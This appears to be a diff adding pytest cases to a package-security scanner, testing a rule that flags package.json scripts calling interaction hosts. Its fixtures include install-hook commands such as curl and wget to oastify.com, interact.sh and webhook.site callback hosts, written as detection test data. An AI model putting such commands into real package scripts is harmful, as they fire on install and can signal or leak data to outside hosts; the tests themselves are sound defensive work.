@@ -178,3 +178,46 @@ class TestNetworkToolsInAnInstallHook:
     def test_does_not_fire(self, tmp_path: Path, scripts: dict) -> None:
         result = self.scan(tmp_path, scripts)
         assert not [f for f in result.findings if f.rule_id == self.PROBE]
+
+
+class TestAnInteractionHostInAScript:
+    """MALWARE.EXFIL.SCRIPT_CALLBACK.001: a script of the package's own package.json names an
+    interaction host (Destinations' list). 8 content misses in 4 groups, 0 benign newly blocked, on the
+    root manifest of every npm unit of rows a3b9c5f1 (scratchpad jsm/pairn-hosts.txt; 6 in 2 groups
+    in an install hook, the part that blocks). Graded with
+    the verdict on, as a user sees it; the fixtures are strings nothing runs."""
+
+    RULE = "MALWARE.EXFIL.SCRIPT_CALLBACK.001"
+
+    @pytest.mark.parametrize(
+        "scripts",
+        [
+            {"postinstall": "curl https://probe.oastify.com/x"},
+            {"preinstall": "wget -q http://a.b.interact.sh"},
+            {"install": "node t.js && curl webhook.site/abc"},
+        ],
+    )
+    def test_blocks_with_the_verdict_on(self, tmp_path: Path, scripts: dict) -> None:
+        result = TestNetworkToolsInAnInstallHook.scan(tmp_path, scripts)
+        found = [f for f in result.findings if f.rule_id == self.RULE]
+        assert len(found) == 1 and found[0].severity >= Severity.HIGH
+
+    def test_a_script_a_person_runs_is_reported_below_the_gate(self, tmp_path: Path) -> None:
+        # Repository grading option A: what a person runs warns; what installing runs blocks.
+        result = TestNetworkToolsInAnInstallHook.scan(
+            tmp_path, {"test": "node t.js && curl webhook.site/abc"}
+        )
+        found = [f for f in result.findings if f.rule_id == self.RULE]
+        assert len(found) == 1 and found[0].severity < Severity.HIGH
+
+    @pytest.mark.parametrize(
+        "scripts",
+        [
+            {"postinstall": "curl https://example.com/x"},
+            {"postinstall": "node install.js --registry https://oastify.com.example.net"},
+            {"docs": "echo see the guide"},
+        ],
+    )
+    def test_does_not_fire(self, tmp_path: Path, scripts: dict) -> None:
+        result = TestNetworkToolsInAnInstallHook.scan(tmp_path, scripts)
+        assert not [f for f in result.findings if f.rule_id == self.RULE]
